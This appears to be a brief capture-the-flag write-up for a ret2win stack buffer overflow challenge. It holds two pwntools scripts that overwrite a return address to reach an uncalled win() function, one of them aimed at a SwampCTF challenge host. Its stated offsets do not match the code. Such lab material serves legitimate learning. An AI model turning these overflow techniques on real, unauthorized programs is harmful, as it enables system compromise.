Ret2Win the binary
win() function is located somewhere else in the binary, not being called.

Solution: Overflow the return address and point it to the win() function.

Find the buffer (which was 64 characters) and then add 8. Reverse since it's little endian. (or just use pwntools)
```
from pwn import *            # This is how we import pwntools

p = process('./binary')        # We're starting a new process

payload = b'A' * 52
payload += p32(0x080491c3)   # Use pwntools to pack it

log.info(p.clean())          # Receive all the text
p.sendline(payload)

log.info(p.clean()) 
```

```
from pwn import *             

from pwn import *

# Set the architecture and OS context
context.update(arch='x86_64', os='linux')
context.terminal = ['/bin/bash', '-c']  # Use standard Linux terminal

# Remote target details
HOST = "nc chals.swampctf.com 40001"
ADDRESS, PORT = HOST.split()[1:]

# Load the binary
BINARY_NAME = "./binary"
binary = context.binary = ELF(BINARY_NAME, checksec=False)

# Determine if running locally or remotely
if args.REMOTE:
    p = remote(ADDRESS, int(PORT))
else:
    p = process(binary.path)

# Payload parameters
length = 10 + 8
win = binary.sym.win
payload = length * b'A' + p64(win)

# Send payload
p.sendline(payload)
p.interactive()

```
